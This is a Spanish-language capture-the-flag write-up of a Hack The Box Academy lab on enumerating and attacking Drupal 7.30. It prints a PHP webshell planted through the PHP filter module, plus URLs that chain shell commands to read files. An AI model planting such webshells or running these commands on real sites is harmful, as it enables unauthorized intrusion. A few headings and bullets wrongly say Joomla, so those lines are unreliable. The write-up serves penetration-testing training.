---
title: "HTB Academy CTF - Enumeracion y ataque a Drupal"
header:
  image: /assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/Enumeracion_ataque_Drupal.png
  teaser: /assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/Enumeracion_ataque_Drupal.png
excerpt: ""
excerpt_separator: "<!--more-->"
share: true
related: true
categories:
  - writeups
featured: true
---

## ¿Que es Joomla?


[Drupal](https://www.drupal.org/), fue lanzado en 2001, es otro CMS de código abierto que es popular entre empresas y desarrolladores. Esta escrito en PHP y admite el uso de MySQL o PostgreSQL para el backend.  Además, se puede utilizar SQLite si no hay un DBMS instalado.

Drupal permite a los usuarios mejorar sus sitios web mediante el uso de temas y módulos.

## ¿Por que es interesante saber enumerar y atacar un sistema Drupal?
-   Es el tercer CMS más popular por participación de mercado
-   Alrededor del 1,5% de los sitios en Internet ejecutan Drupal.
-   Está disponible en 100 idiomas
-   tiene casi 43.000 módulos y 2.900 temas.
-   Está escrito en PHP.
-   33 de las empresas Fortune 500 utilizan Drupal de alguna manera
-   El 56% de los sitios web gubernamentales en todo el mundo utilizan Drupal
-   El 23,8% de las universidades, colegios y escuelas utilizan Drupal en todo el mundo
-   Hay hasta 2,5 millones de sitios en Internet que utilizan Joomla. 
-   Algunas de las principales marcas que utilizan Drupal incluyen: Tesla y Warner Bros Records


Para mostrar como enumerar y atacar Drupal voy a utilizar un entorno controlado donde una maquina tiene los vhosts drupal.inlanefreight.local
drupal-qa.inlanefreight.local con IP 10.129.184.121.

## Descubrimiento

Un sitio web basado en Drupal puede reconocerse de varias formas: por el texto de cabecera o pie Powered by Drupal, el logotipo típico del CMS, la exposición de ficheros como CHANGELOG.txt o README.txt, indicios en el código fuente (metadatos, rutas y assets característicos) y pistas en robots.txt, como referencias a rutas habituales tipo /node.

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/drupal.png)

Otra forma de identificar Drupal es a través de los nodos. Drupal estructura e indexa el contenido como nodos (p. ej., una entrada de blog, una encuesta o un artículo) y, en configuraciones por defecto o comunes, las URLs suelen seguir el patrón /node/<id>, donde <id> es el identificador numérico del nodo.

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image.png)


Drupal define, por defecto, tres perfiles de usuario:

- Administrator: control total sobre el sitio Drupal.
  
- Authenticated User: usuarios con sesión iniciada; pueden realizar acciones como crear o editar contenido según los permisos asignados.
  
- Anonymous: visitantes sin autenticación; normalmente limitados a lectura de contenido público.

## Enumeracion

Puedo realizar una combinación de enumeración manual y basada en herramientas (automatizada) para descubrir la versión, los complementos instalados y más detalles sobre Drupal.

Dependiendo de la versión de Drupal y de las medidas de endurecimiento que se hayan implementado, es posible que necesitemos probar varias formas de identificar el número de versión. Las instalaciones más nuevas de Drupal bloquean de forma predeterminada el acceso al CHANGELOG.txt y README.txt

Si compruebo el archivo CHANGELOG.txt de la instalacion de Drupal con el comando:

```
curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Obtengo : Drupal 7.30, 2014-07-24

![alt text](</assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/drupal_1.png>)

Aquí he identificado una versión anterior de Drupal en uso. Si fuera mas actual hubiera contestado con un error404. 

Utilizare Droopescan para escanear de forma automatizada, para ello instalo droopescan con 

```
sudo pip3 install droopescan
```

Lanzo un escaneo

```
droopescan scan drupal -u http://drupal-qa.inlanefreight.local
```

y tras unos segundos de escaneo me devuelve la siguiente informacion.

```
[+] Plugins found:                                                              
    profile http://drupal-qa.inlanefreight.local/modules/profile/
    php http://drupal-qa.inlanefreight.local/modules/php/
    image http://drupal-qa.inlanefreight.local/modules/image/

[+] Themes found:
    seven http://drupal-qa.inlanefreight.local/themes/seven/
    garland http://drupal-qa.inlanefreight.local/themes/garland/

[+] Possible version(s):
    7.30

[+] Possible interesting urls found:
    Default changelog file - http://drupal-qa.inlanefreight.local/CHANGELOG.txt
    Default admin - http://drupal-qa.inlanefreight.local/user/login

[+] Scan finished (0:01:39.074144 elapsed)
```

![alt text](</assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/carbon (2).png>)


Esta instancia parece estar ejecutando la versión 7.30 de Drupal. Al momento de escribir este artículo, esta no era la última versión, ya que se lanzó en julio de 2014. 

Una búsqueda rápida de vulnerabilidades relacionada con Drupal no muestra nada evidente para esta versión principal de Drupal. En este caso, a continuación querríamos analizar los complementos instalados o el abuso de la funcionalidad incorporada.

## Atacando Drupal

### Aprovechar el módulo de filtro PHP

En versiones anteriores a la version 8 de Drupal, era posible iniciar sesión como administrador y habilitar el modulo PHP filter, que "permite evaluar código/fragmentos PHP integrados"

En primer lugar necesitamos acceder al modulo de administracion de drupal.

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-1.png)

En este caso he probado el acceso trivial admin:admin y ha sido correcto.

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-4.png)

Desde el menu de content puedo crear una pagina basica que tenga un fragmento de PHP malicioso que permita la ejecucion de codigo. 

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-5.png)

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-6.png)


Por ejemplo ``` system($_GET['cmd']); ``` aunque es mejor hacerlo con un valor hasheado para evitar que otro atacante se encuentre nuestro webshell y lo use.

Agrego una pagina con el codigo siguiente: 

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-7.png)

Y me aseguro de configurar Text format desplegable a PHP code

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-8.png)

Pulso en guardar la pagina y obtengo la confirmacion.

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-9.png)

Ahora puedo consultar datos desde el navegador o usando curl. Por ejemplo una consulta de usuario `http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id`

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-10.png)

Tambien podriamos leer contenido de ficheros por ejemplo consultando 

```
http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=cd%20/var/www/drupal.inlanefreight.local;%20ls;%20cat%20flag_6470e394cbf6dab6a91682cc8585059b.txt
```

lo que me daria el contenido del fichero txt

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-11.png)

Como dije antes a partir de la versión 8, el Filtro PHP El módulo no está instalado de forma predeterminada. Para aprovechar esta funcionalidad, tendríamos que instalar el módulo nosotros mismos. Esto seria cambiar el sistema del cliente auditado porlo que deberiamos comprobar el scope y consultar con el cliente primero. 

Para ver como hacerlo lo mostrare con el host drupal-dev.inlanefreight.local que monta una version mas actual de Drupal. 

El primer paso seria descargar la versión más reciente del módulo desde el sitio web de Drupal. 

```sh
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Una vez descargado ire a Administracion > Reports > Available updates.

![alt text](/assets/images/posts/HTB_Academy_CTF_Enumeracion_y_ataque_a_Drupal/image-12.png)

Con cualquiera de estos ejemplos, debemos mantener informado a nuestro cliente y obtener permiso antes de realizar este tipo de cambios. Además, una vez que hayamos terminado, debemos eliminar o deshabilitar el PHP Filter module y elimine cualquier página que hayamos creado para obtener la ejecución remota de código.

### Aprovechar las vulnerabilidades conocidas

A lo largo de los años, el núcleo de Drupal ha sufrido algunas vulnerabilidades graves de ejecución remota de código, cada una de ellas denominada Drupalgeddon. Al momento de escribir este artículo, existen 3 vulnerabilidades de Drupalgeddon.

- **CVE-2014-3704**, conocido como **Drupalgeddon**, afecta las versiones 7.0 hasta 7.31 y se solucionó en la versión 7.32. Esta fue una falla de inyección SQL preautenticada que podría usarse para cargar un formulario malicioso o crear un nuevo usuario administrador.
  
- **CVE-2018-7600**, también conocida como **Drupalgeddon2**, es una vulnerabilidad de ejecución remota de código, que afecta a versiones de Drupal anteriores a 7.58 y 8.5.1. La vulnerabilidad se produce debido a una desinfección de entrada insuficiente durante el registro del usuario, lo que permite inyectar maliciosamente comandos a nivel de sistema.
  
- **CVE-2018-7602**, también conocida como **Drupalgeddon3**, es una vulnerabilidad de ejecución remota de código que afecta a múltiples versiones de Drupal 7.x y 8.x. Esta falla explota una validación incorrecta en la API de formulario.

